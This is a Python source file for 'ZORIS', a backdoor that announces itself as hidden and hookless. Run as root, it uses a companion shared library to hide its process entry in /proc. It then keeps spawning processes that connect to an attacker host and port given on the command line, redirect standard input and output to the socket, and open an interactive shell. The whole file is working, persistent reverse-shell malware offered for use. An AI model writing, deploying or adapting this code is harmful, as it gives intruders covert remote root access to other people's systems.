#/usr/bin/env python3
import socket
import subprocess
import os
import pty
import random
import time
import threading
from multiprocessing import Process
from ctypes import *
import argparse

tempo_sleep = 5
hidden = CDLL(f'{os.getcwd()}/hidden.so')
pid = os.getpid() - 1

def banner():
    print("""\033[0;36m
                                                        .      
    oN0.                                               .OK:    
   ,0X0.                                               .kNK.   
  .xKKO                .:ok0Oxl:lxOOkd:.               .dXNd   
  :0KKk              'cxk0KXNX0OOKKNNXKOc.             .dKWX,  
 .o000O:          .:dkO00KKXNNX0KKKWNNNNX0x:.         .c0KNNo  
  .okO0Ox,   ..':dkO0KKKKK00KXNNNKKKXXNNWNXK0x:'..  .cOKXKKx.  
   .lxO0OkkOOOOO000KKKK000KKNNNWMMWWNKKKXNNXXXXKKKK000NXXKd.   
     :xkkO0000KKKK00OOkkkk00KKXNWMWXKK0O000XNNWWNXKKKXXX0c     
      ;dxxxxkkkO0Okkkxxxkk00KKXWMMWNXXX0OOOO0KXK0OOOOOOk;      
        ..',;:clxxdocodOOkOKKKXNNNNXKXNX0dldkkkdlc:;,'.        
              .;::::;:okOkkO0KKXXXKKKKKKOd;:cll:.              
            .:lccccc:::lokk0KKKXXXKKKK0OOollooddd:             
           .loolllcc;,:lodk0KKKXXKKKKXXOo:odddxxkkl            
           .cc:;'..   .:lodOKKKXKKKKKXKo   ..,;cool            
                       .codk00KKXKKXX0k.                       
                        ,cdk0KKNWXKXXO:                        
                        'dkOKKXWMWNXKO.                        
                        ck00O0KKXK0KKX:                        
                        .:oxxxkOkkkxo;                         
                           .,:clc:,.                        

            \033[0;36m[\033[0;37mZORIS - The hidden hookless backdoor\033[0;36m]
                    \033[0;36m[\033[0;37mDeveloped by MrEmpy\033[0;36m]\033[0;37m\n""")

def rev_shell():
    try:
        hidden.get_pid()
        hidden.mount_pid()
        os.remove('pid.txt')
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((arguments.rhost, int(arguments.rport)))
        os.dup2(s.fileno(),0)
        os.dup2(s.fileno(),1)
        os.dup2(s.fileno(),2)
        pty.spawn('sh')

    except:
        return

def main():
    hidden.get_pid()
    hidden.mount_pid()
    open('pid.txt', 'a')
    pid_f = open('pid.txt', 'w')
    pid_f.write('/proc/{}'.format(pid))
    pid_f.close()
    hidden.mount_pid()
    os.remove('pid.txt')
    print('\033[0;32m[+]\033[0;37m Backdoor started')
    while True:
        thread_ids = []
        for i in range(0, 7):
            time.sleep(tempo_sleep)
            new_thread = Process(target=rev_shell)
            new_thread.start()
            thread_ids.append(new_thread)

if __name__ == '__main__':
    if os.geteuid() != 0:
        banner()
        print('\033[0;31m[!]\033[0;37m Please run as root')
    else:
        banner()
        parser = argparse.ArgumentParser()
        parser.add_argument('-rh','--host', action='store', help='Attacker host', dest='rhost', required=True)
        parser.add_argument('-rp','--port', action='store', help='Attacker port', dest='rport', required=True)
        arguments = parser.parse_args()
        main()
